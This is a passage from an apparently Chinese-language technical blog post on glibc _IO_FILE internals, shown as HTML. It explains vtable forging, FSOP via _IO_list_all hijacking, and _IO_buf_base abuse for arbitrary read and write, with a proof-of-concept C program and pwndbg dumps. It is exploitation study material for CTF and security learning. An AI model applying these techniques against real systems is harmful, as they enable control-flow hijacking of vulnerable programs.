</span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>buffer 存放读取数据的缓冲区。</li>\n<li>size：指定每个记录的长度。</li>\n<li>count： 指定记录的个数。</li>\n<li>stream：目标文件流。</li>\n<li>返回值：返回读取到数据缓冲区中的记录个数</li>\n</ul>\n</blockquote>\n<p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的</p>\n<h2 id=\"3-fwrite\"><a href=\"#3-fwrite\" class=\"headerlink\" title=\"3.fwrite\"></a>3.fwrite</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fwrite</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">void</span>* <span class=\"built_in\">buffer</span>, <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>, <span class=\"keyword\">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>\n<li>size: 要写入内容的单字节数;</li>\n<li>count: 要进行写入 size 字节的数据项的个数;</li>\n<li>stream: 目标文件指针;</li>\n<li>返回值：实际写入的数据项个数 count。</li>\n</ul>\n</blockquote>\n<p>在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p>\n<p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p>\n<p>IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p>\n<p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p>\n<h2 id=\"4-fopen\"><a href=\"#4-fopen\" class=\"headerlink\" title=\"4.fopen\"></a>4.fopen</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">FILE *<span class=\"title\">fopen</span><span class=\"params\">(<span class=\"keyword\">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>filename: 目标文件的路径</li>\n<li>type: 打开方式的类型</li>\n<li>返回值: 返回一个文件指针</li>\n</ul>\n</blockquote>\n<ul>\n<li>使用 malloc 分配 FILE 结构</li>\n<li>设置 FILE 结构的 vtable</li>\n<li>初始化分配的 FILE 结构</li>\n<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>\n<li>调用系统调用打开文件</li>\n</ul>\n<h2 id=\"5-fclose\"><a href=\"#5-fclose\" class=\"headerlink\" title=\"5.fclose\"></a>5.fclose</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int fclose(FILE *stream)</span><br></pre></td></tr></table></figure>\n<p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>\n<h2 id=\"6-printf-puts\"><a href=\"#6-printf-puts\" class=\"headerlink\" title=\"6.printf/puts\"></a>6.printf/puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>\n<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vfprintf+11</span><br><span class=\"line\">_IO_file_xsputn</span><br><span class=\"line\">_IO_file_overflow</span><br><span class=\"line\">funlockfile</span><br><span class=\"line\">_IO_file_write</span><br><span class=\"line\">write</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-伪造vtable\"><a href=\"#0x02-伪造vtable\" class=\"headerlink\" title=\"0x02 伪造vtable\"></a>0x02 伪造vtable</h1><p>伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p>\n<ol>\n<li>直接改写 vtable 中的函数指针，通过任意地址写就可以实现。</li>\n<li>覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</li>\n</ol>\n<h1 id=\"0x03-FSOP\"><a href=\"#0x03-FSOP\" class=\"headerlink\" title=\"0x03 FSOP\"></a>0x03 FSOP</h1><p>File Stream Oriented Programming</p>\n<h2 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1.基本概念\"></a>1.基本概念</h2><p>FSOP 的核心思想就是<strong>劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。</strong>FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>\n<p><img src=\"/2021/03/25/IO-FILE/abort_routine.001.jpeg\" alt=\"img\"></p>\n<p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>\n<ol>\n<li><p>当 libc 执行 abort 流程时</p>\n</li>\n<li><p>当执行 exit 函数时</p>\n</li>\n<li><p>当执行流从 main 函数返回时</p>\n</li>\n</ol>\n<h2 id=\"2-利用条件\"><a href=\"#2-利用条件\" class=\"headerlink\" title=\"2.利用条件\"></a>2.利用条件</h2><ol>\n<li><p>知道libc基址</p>\n</li>\n<li><p>改写_IO_list_all为可控内存的指针</p>\n</li>\n<li><p>通过验证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class=\"line\">               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">               result &#x3D; EOF;</span><br><span class=\"line\">          &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>fp-&gt;_mode &lt;= 0</li>\n<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<p>这里拿一个wiki上的例子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> mode_offset 0xc0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> writeptr_offset 0x28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> writebase_offset 0x20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> vtable_offset 0xd8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *ptr;</span><br><span class=\"line\">    <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *list_all_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+mode_offset)=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+writeptr_offset)=<span class=\"number\">0x1</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+writebase_offset)=<span class=\"number\">0x0</span>;</span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+vtable_offset)=((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+<span class=\"number\">0x100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>*)((<span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)ptr+<span class=\"number\">0x100</span>+<span class=\"number\">24</span>)=<span class=\"number\">0x41414141</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    list_all_ptr=(<span class=\"keyword\">long</span> <span class=\"keyword\">long</span> *)_IO_list_all;</span><br><span class=\"line\"></span><br><span class=\"line\">    list_all_ptr[<span class=\"number\">0</span>]=ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>前0x100是_IO_FILE </p>\n<p>之后0x100是vtable</p>\n<p>0x18就是overflow的偏移</p>\n</blockquote>\n<h1 id=\"0x04-libc2-24新应用\"><a href=\"#0x04-libc2-24新应用\" class=\"headerlink\" title=\"0x04 libc2.24新应用\"></a>0x04 libc2.24新应用</h1><p>libc2.24中注重对_IO_FILE结构体内的区域的利用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags;       <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_base; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_backup_base;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_end; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _fileno;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags2;</span><br><span class=\"line\">  _IO_off_t _old_offset; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>在_IO_FILE 中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p>\n<h2 id=\"1-fileno与缓冲区的相关利用\"><a href=\"#1-fileno与缓冲区的相关利用\" class=\"headerlink\" title=\"1.fileno与缓冲区的相关利用\"></a>1.fileno与缓冲区的相关利用</h2><p><strong>eg</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">char</span> buf[<span class=\"number\">100</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"keyword\">char</span> stack_buf[<span class=\"number\">100</span>];</span><br><span class=\"line\"> <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,stack_buf);</span><br><span class=\"line\"> <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,stack_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看第一次初始化,里面很多内容还是空</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x7ffff7dd18e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:\t<span class=\"number\">0x00000000fbad2088</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class=\"number\">32</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class=\"number\">48</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class=\"number\">64</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class=\"number\">80</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class=\"number\">96</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class=\"number\">112</span>&gt;:\t<span class=\"number\">0x0000001000000000</span>\t<span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class=\"number\">128</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd3790</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class=\"number\">144</span>&gt;:\t<span class=\"number\">0xffffffffffffffff</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class=\"number\">160</span>&gt;:\t<span class=\"number\">0x00007ffff7dd19c0</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class=\"number\">176</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">192</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">208</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd06e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>进行一次输入之后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x7ffff7dd18e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:\t<span class=\"number\">0x00000000fbad2288</span>\t<span class=\"number\">0x0000000000602018</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000602019</span>\t<span class=\"number\">0x0000000000602010</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class=\"number\">32</span>&gt;:\t<span class=\"number\">0x0000000000602010</span>\t<span class=\"number\">0x0000000000602010</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class=\"number\">48</span>&gt;:\t<span class=\"number\">0x0000000000602010</span>\t<span class=\"number\">0x0000000000602010</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class=\"number\">64</span>&gt;:\t<span class=\"number\">0x0000000000602410</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class=\"number\">80</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class=\"number\">96</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class=\"number\">112</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class=\"number\">128</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd3790</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class=\"number\">144</span>&gt;:\t<span class=\"number\">0xffffffffffffffff</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class=\"number\">160</span>&gt;:\t<span class=\"number\">0x00007ffff7dd19c0</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class=\"number\">176</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">192</span>&gt;:\t<span class=\"number\">0x00000000ffffffff</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">208</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd06e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p>\n</blockquote>\n<p>其实这是分配出来的堆,分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x602000</span></span><br><span class=\"line\">Size: <span class=\"number\">0x411</span></span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: <span class=\"number\">0x602410</span></span><br><span class=\"line\">Size: <span class=\"number\">0x20bf1</span></span><br></pre></td></tr></table></figure>\n<p>接下来就可以修改_IO_buf_base任意地址读写了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx <span class=\"number\">0x7ffff7dd18e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:\t<span class=\"number\">0x00000000fbad2288</span>\t<span class=\"number\">0x0000000000602018</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x0000000000602019</span>\t<span class=\"number\">0x0000000000602010</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class=\"number\">32</span>&gt;:\t<span class=\"number\">0x0000000000602010</span>\t<span class=\"number\">0x0000000000602010</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class=\"number\">48</span>&gt;:\t<span class=\"number\">0x0000000000602010</span>\t<span class=\"number\">0x00007ffff7dd2740</span> &lt;==_IO_buf_base</span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class=\"number\">64</span>&gt;:\t<span class=\"number\">0x00007ffff7dd27c0</span>\t<span class=\"number\">0x0000000000000000</span> &lt;==_IO_buf_end</span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class=\"number\">80</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class=\"number\">96</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class=\"number\">112</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class=\"number\">128</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd3790</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class=\"number\">144</span>&gt;:\t<span class=\"number\">0xffffffffffffffff</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class=\"number\">160</span>&gt;:\t<span class=\"number\">0x00007ffff7dd19c0</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class=\"number\">176</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">192</span>&gt;:\t<span class=\"number\">0x00000000ffffffff</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class=\"number\">208</span>&gt;:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00007ffff7dd06e0</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7dd19c0</span> 